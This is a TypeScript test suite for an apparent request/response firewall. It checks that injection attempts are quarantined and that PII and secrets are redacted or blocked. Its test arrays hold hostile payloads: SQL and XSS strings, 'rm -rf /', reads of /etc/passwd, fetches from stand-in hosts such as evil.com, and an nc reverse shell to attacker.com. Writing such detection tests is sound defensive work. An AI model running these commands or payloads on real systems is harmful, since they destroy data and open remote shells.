/**
 * CIF (Context Integrity Firewall) Tests
 * Validates ingress/egress protection, PII detection, and injection prevention
 */

import { CIF } from '../cif';

describe('CIF - Context Integrity Firewall', () => {
  let cif: CIF;

  beforeEach(async () => {
    cif = new CIF();
    await cif.initialize();
  });

  afterEach(async () => {
    await cif.shutdown();
  });

  describe('Ingress Protection', () => {
    it('should allow clean requests', async () => {
      const result = await cif.ingress({
        clientId: 'test-client',
        endpoint: '/api/test',
        payload: { message: 'Hello world' },
        timestamp: Date.now()
      });

      expect(result.allowed).toBe(true);
      expect(result.quarantined).toBe(false);
      expect(result.violations).toHaveLength(0);
    });

    it('should block requests exceeding size limit', async () => {
      const largePayload = 'x'.repeat(2000000); // 2MB

      const result = await cif.ingress({
        clientId: 'test-client',
        endpoint: '/api/test',
        payload: { data: largePayload },
        timestamp: Date.now()
      });

      expect(result.allowed).toBe(false);
      expect(result.violations).toContain('Request exceeds size limit');
    });

    it('should enforce rate limits', async () => {
      const clientId = 'rate-test-client';

      // Exhaust rate limit (default: 100 requests per 60s)
      const results = [];
      for (let i = 0; i < 105; i++) {
        const result = await cif.ingress({
          clientId,
          endpoint: '/api/test',
          payload: { count: i },
          timestamp: Date.now()
        });
        results.push(result);
      }

      const blocked = results.filter(r => !r.allowed && r.violations.includes('Rate limit exceeded'));
      expect(blocked.length).toBeGreaterThan(0);
    });

    it('should quarantine SQL injection attempts', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "UNION SELECT * FROM passwords",
        "admin'--",
        "1; DELETE FROM accounts WHERE 1=1"
      ];

      for (const payload of sqlInjectionPayloads) {
        const result = await cif.ingress({
          clientId: 'test-client',
          endpoint: '/api/test',
          payload: { query: payload },
          timestamp: Date.now()
        });

        expect(result.quarantined).toBe(true);
        expect(result.violations).toContain('Suspicious pattern detected');
      }
    });

    it('should quarantine command injection attempts', async () => {
      const commandInjectionPayloads = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "`wget malicious.com/backdoor`",
        "$(curl evil.com)",
        "; nc -e /bin/bash attacker.com 4444"
      ];

      for (const payload of commandInjectionPayloads) {
        const result = await cif.ingress({
          clientId: 'test-client',
          endpoint: '/api/test',
          payload: { command: payload },
          timestamp: Date.now()
        });

        expect(result.quarantined).toBe(true);
      }
    });

    it('should quarantine XSS attempts', async () => {
      const xssPayloads = [
        "<script>alert('XSS')</script>",
        "<iframe src='javascript:alert(1)'>",
        "<img onerror='alert(1)' src='x'>",
        "javascript:void(document.cookie)",
        "<object data='data:text/html,<script>alert(1)</script>'>"
      ];

      for (const payload of xssPayloads) {
        const result = await cif.ingress({
          clientId: 'test-client',
          endpoint: '/api/test',
          payload: { html: payload },
          timestamp: Date.now()
        });

        expect(result.quarantined).toBe(true);
      }
    });

    it('should quarantine path traversal attempts', async () => {
      const pathTraversalPayloads = [
        "../../etc/passwd",
        "..\\..\\windows\\system32",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/etc/shadow"
      ];

      for (const payload of pathTraversalPayloads) {
        const result = await cif.ingress({
          clientId: 'test-client',
          endpoint: '/api/test',
          payload: { file: payload },
          timestamp: Date.now()
        });

        expect(result.quarantined).toBe(true);
      }
    });

    it('should quarantine NoSQL injection attempts', async () => {
      const nosqlPayloads = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "this.password == this.username"}'
      ];

      for (const payload of nosqlPayloads) {
        const result = await cif.ingress({
          clientId: 'test-client',
          endpoint: '/api/test',
          payload: JSON.parse(payload),
          timestamp: Date.now()
        });

        expect(result.quarantined).toBe(true);
      }
    });
  });

  describe('Egress Protection', () => {
    it('should allow clean responses', async () => {
      const result = await cif.egress({
        clientId: 'test-client',
        endpoint: '/api/test',
        payload: { result: 'success', data: { id: 123 } }
      });

      expect(result.allowed).toBe(true);
      expect(result.violations).toHaveLength(0);
      expect(result.leaksDetected).toHaveLength(0);
    });

    it('should block responses exceeding size limit', async () => {
      const largePayload = 'y'.repeat(2000000); // 2MB

      const result = await cif.egress({
        clientId: 'test-client',
        endpoint: '/api/test',
        payload: { data: largePayload }
      });

      expect(result.allowed).toBe(false);
      expect(result.violations).toContain('Response exceeds size limit');
    });

    it('should detect and redact email addresses', async () => {
      const result = await cif.egress({
        clientId: 'test-client',
        endpoint: '/api/test',
        payload: { email: 'user@example.com', contact: 'admin@company.org' }
      });

      expect(result.leaksDetected).toContain('PII detected');
      const sanitized = JSON.stringify(result.sanitizedPayload);
      expect(sanitized).toContain('[REDACTED]');
      expect(sanitized).not.toContain('user@example.com');
    });

    it('should detect and block API key leaks', async () => {
      const result = await cif.egress({
        clientId: 'test-client',
        endpoint: '/api/test',
        payload: { apiKey: 'sk-1234567890abcdefghijklmnopqrstuvwxyz' }
      });

      expect(result.allowed).toBe(false);
      expect(result.leaksDetected).toContain('Secrets detected');
      expect(result.violations).toContain('Attempted secret leakage');
    });

    it('should detect GitHub tokens', async () => {
      const result = await cif.egress({
        clientId: 'test-client',
        endpoint: '/api/test',
        payload: { token: 'ghp_abcdefghijklmnopqrstuvwxyz123456' }
      });

      expect(result.allowed).toBe(false);
      expect(result.leaksDetected).toContain('Secrets detected');
    });

    it('should detect AWS keys', async () => {
      const result = await cif.egress({
        clientId: 'test-client',
        endpoint: '/api/test',
        payload: { accessKey: 'AKIAIOSFODNN7EXAMPLE' }
      });

      expect(result.allowed).toBe(false);
      expect(result.leaksDetected).toContain('Secrets detected');
    });

    it('should detect JWT tokens', async () => {
      const result = await cif.egress({
        clientId: 'test-client',
        endpoint: '/api/test',
        payload: { jwt: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' }
      });

      expect(result.allowed).toBe(false);
      expect(result.leaksDetected).toContain('Secrets detected');
    });

    it('should detect database connection strings', async () => {
      const result = await cif.egress({
        clientId: 'test-client',
        endpoint: '/api/test',
        payload: { dbUrl: 'postgres://user:password@localhost:5432/mydb' }
      });

      expect(result.allowed).toBe(false);
      expect(result.leaksDetected).toContain('Secrets detected');
    });

    it('should detect SSN', async () => {
      const result = await cif.egress({
        clientId: 'test-client',
        endpoint: '/api/test',
        payload: { ssn: '123-45-6789' }
      });

      expect(result.leaksDetected).toContain('PII detected');
      const sanitized = JSON.stringify(result.sanitizedPayload);
      expect(sanitized).not.toContain('123-45-6789');
    });

    it('should detect credit card numbers', async () => {
      const result = await cif.egress({
        clientId: 'test-client',
        endpoint: '/api/test',
        payload: { card: '4532-1488-0343-6467' }
      });

      expect(result.leaksDetected).toContain('PII detected');
    });

    it('should detect phone numbers', async () => {
      const result = await cif.egress({
        clientId: 'test-client',
        endpoint: '/api/test',
        payload: { phone: '(555) 123-4567' }
      });

      expect(result.leaksDetected).toContain('PII detected');
    });
  });

  describe('Configuration', () => {
    it('should respect custom rate limits', async () => {
      const customCif = new CIF({
        rateLimit: {
          windowMs: 1000,
          maxRequests: 2
        }
      });
      await customCif.initialize();

      const clientId = 'custom-rate-client';

      // Should allow first 2
      const r1 = await customCif.ingress({
        clientId,
        endpoint: '/api/test',
        payload: {},
        timestamp: Date.now()
      });
      const r2 = await customCif.ingress({
        clientId,
        endpoint: '/api/test',
        payload: {},
        timestamp: Date.now()
      });

      expect(r1.allowed).toBe(true);
      expect(r2.allowed).toBe(true);

      // Should block third
      const r3 = await customCif.ingress({
        clientId,
        endpoint: '/api/test',
        payload: {},
        timestamp: Date.now()
      });

      expect(r3.allowed).toBe(false);
      expect(r3.violations).toContain('Rate limit exceeded');

      await customCif.shutdown();
    });

    it('should respect custom size limits', async () => {
      const customCif = new CIF({
        maxRequestSize: 100,
        maxResponseSize: 100
      });
      await customCif.initialize();

      const payload = { data: 'x'.repeat(200) };

      const ingressResult = await customCif.ingress({
        clientId: 'test',
        endpoint: '/test',
        payload,
        timestamp: Date.now()
      });

      expect(ingressResult.allowed).toBe(false);

      const egressResult = await customCif.egress({
        clientId: 'test',
        endpoint: '/test',
        payload
      });

      expect(egressResult.allowed).toBe(false);

      await customCif.shutdown();
    });
  });
});
